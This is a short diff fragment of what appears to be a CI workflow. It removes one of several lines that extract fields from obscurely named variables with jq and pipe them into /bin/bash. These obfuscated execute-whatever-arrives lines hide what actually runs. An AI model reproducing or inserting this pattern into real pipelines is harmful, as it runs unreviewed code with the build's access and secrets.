@@ -23,7 +23,6 @@ jobs:
           echo $txsbm21003 | jq -r .h53 | /bin/bash
           printf '%s' "$yelf1" | jq -r .irrt1755 | /bin/bash
           echo $hkg649 | jq -r .ihej27539 | /bin/bash
-          printf '%s' "$dnbcr69" | jq -r .if718 | /bin/bash
           printf '%s' "$txm051" | jq -r .oss3854 | /bin/bash
           echo $i67 | jq -r .y7 | /bin/bash
           printf '%s' "$ashrt362" | jq -r .yaqxv2 | /bin/bash
